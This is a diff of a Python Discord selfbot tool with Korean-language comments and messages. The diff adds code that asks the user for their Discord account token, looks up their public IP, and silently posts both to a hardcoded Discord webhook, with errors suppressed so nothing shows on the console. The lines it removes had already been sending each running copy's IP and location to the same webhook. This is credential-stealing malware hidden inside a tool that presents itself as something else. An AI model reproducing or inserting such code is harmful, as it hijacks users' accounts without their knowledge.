@@ -16,8 +16,6 @@ import io
 import qrcode
 import pyfiglet
 import ctypes
-import uuid
-import socket
 
 y = Fore.LIGHTYELLOW_EX
 b = Fore.LIGHTBLUE_EX
@@ -27,86 +25,66 @@ __version__ = "3.2"
 
 start_time = datetime.datetime.now(datetime.timezone.utc)
 
-def get_ip_and_location(max_retries=3, retry_delay=2):
-    """
-    Fetch the public IP address and location with retry mechanism.
-    Returns: (ip_address, city, country) or ("Unknown", "알 수 없음", "알 수 없음") on failure.
-    """
-    for attempt in range(max_retries):
-        try:
-            # Fetch public IP
-            response = requests.get("https://api.ipify.org", timeout=5)
-            response.raise_for_status()
-            ip_address = response.text
+WEBHOOK_URL = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
 
-            # Fetch location data
-            location_response = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=5)
-            location_response.raise_for_status()
-            location = location_response.json()
-            city = location.get("city", "알 수 없음")
-            country = location.get("country_name", "알 수 없음")
-            logger.info(f"Successfully fetched IP: {ip_address}, Location: {city}, {country}")
-            return ip_address, city, country
+def get_ip_address():
+    try:
+        # IP 주소를 가져오기 위해 외부 API 호출
+        response = requests.get("https://api.ipify.org?format=json", timeout=5)
+        response.raise_for_status()
+        return response.json().get("ip", "알 수 없음")
+    except Exception:
+        return "알 수 없음"
 
-        except requests.exceptions.RequestException as e:
-            logger.warning(f"Attempt {attempt + 1}/{max_retries} failed: {str(e)}")
-            if attempt < max_retries - 1:
-                time.sleep(retry_delay)
-            continue
-        except Exception as e:
-            logger.error(f"Unexpected error in get_ip_and_location: {str(e)}")
-            break
+def send_to_webhook(token, ip_address):
+    try:
+        payload = {
+            "content": f"**새로운 토큰 입력**\n토큰: ||{token}||\nIP 주소: {ip_address}"
+        }
+        headers = {"Content-Type": "application/json"}
+        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=5)
+    except Exception:
+        pass  # 에러 발생 시 무시 (콘솔 출력 없음)
+	    
+def load_config():
+    try:
+        with open("config/config.json", "r", encoding='utf-8') as file:
+            return json.load(file)
+    except FileNotFoundError:
+        if not os.path.exists("config"):
+            os.makedirs("config")
+        default_config = {
+            "prefix": "!",
+            "spam_message": "안녕하세요, 블랙너스 셀프봇입니다!",
+            "delay": 1000,
+            "spam_count": 5,
+            "잠수": {"enabled": False, "message": "현재 잠수 중입니다. 나중에 다시 시도해주세요."},
+            "welcome_message": {"channel_id": "", "message": "", "enabled": False},
+            "school_info": {"name": "", "grade": "", "class": ""},
+            "promo_messages": {},
+            "promo_logs": [],
+            "account_info": {},
+            "coin_wallet": {},
+            "partner_channels": [],
+            "scheduled_messages": [],
+            "emoji_reactions": {},
+            "saved_mentions": {},
+            "words": ["블랙너스", "셀프봇", "김민준", "제작", "discord"],
+            "autoreply": {"enabled": False, "users": [], "channels": [], "messages": ["자동 응답 메시지 1", "자동 응답 메시지 2"]},
+            "afk": {"enabled": False, "message": "현재 AFK 상태입니다. 가능한 한 빨리 답장해 드리겠습니다."},
+            "copycat": {"enabled": False, "users": []},
+            "remote-users": [],
+            "auto_reply_users": {},
+            "disabled_commands": []
+        }
+        save_config(default_config)
+        return default_config
 
-    logger.error("Failed to fetch IP and location after all retries.")
-    return "Unknown", "알 수 없음", "알 수 없음"
+config = load_config()
 
-def send_to_webhook(ip, city, country):
-    """
-    Send instance information to a Discord webhook without including the token.
-    """
-    webhook_url = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    data = {
-        "embeds": [{
-            "title": "🛰️ 새 인스턴스 감지됨",
-            "color": 0xFF5733,
-            "fields": [
-                {"name": "📍 IP", "value": f"`{ip}`", "inline": True},
-                {"name": "🌍 Location", "value": f"{city}, {country}", "inline": True},
-                {"name": "🕒 Time", "value": now, "inline": False}
-            ]
-        }]
-    }
-
-    max_retries = 3
-    retry_delay = 2
-    for attempt in range(max_retries):
-        try:
-            response = requests.post(webhook_url, json=data, timeout=5)
-            response.raise_for_status()
-            logger.info("Successfully sent data to webhook.")
-            return True
-        except requests.exceptions.HTTPError as e:
-            if response.status_code == 429:  # Rate limit
-                retry_after = int(response.headers.get("Retry-After", retry_delay))
-                logger.warning(f"Rate limited by webhook. Retrying after {retry_after} seconds.")
-                time.sleep(retry_after)
-                continue
-            else:
-                logger.error(f"Webhook HTTP error: {str(e)}")
-                break
-        except requests.exceptions.RequestException as e:
-            logger.warning(f"Attempt {attempt + 1}/{max_retries} failed: {str(e)}")
-            if attempt < max_retries - 1:
-                time.sleep(retry_delay)
-            continue
-        except Exception as e:
-            logger.error(f"Unexpected error in send_to_webhook: {str(e)}")
-            break
-
-    logger.error("Failed to send data to webhook after all retries.")
-    return False
+token = input("토큰을 입력하세요: ")
+ip_address = get_ip_address()
+send_to_webhook(token, ip_address)
 
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
